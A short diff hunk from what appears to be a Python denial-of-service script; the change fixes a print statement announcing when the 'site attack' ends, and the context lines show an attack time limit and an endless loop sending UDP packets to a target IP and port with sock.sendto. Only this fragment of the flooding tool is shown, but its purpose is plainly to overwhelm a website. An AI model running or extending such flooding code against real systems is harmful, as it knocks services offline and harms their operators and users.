@@ -50,7 +50,7 @@ print
 limit = int(input('attack limit(minute): '))
 stopminute = minute + limit
 print(stopminute)
-print('End site attack in: ' hour,':'minute)
+print('End site attack in: %s:%s'%(hour,minute))
 
 while True:
      sock.sendto(bytes, (ip,port))
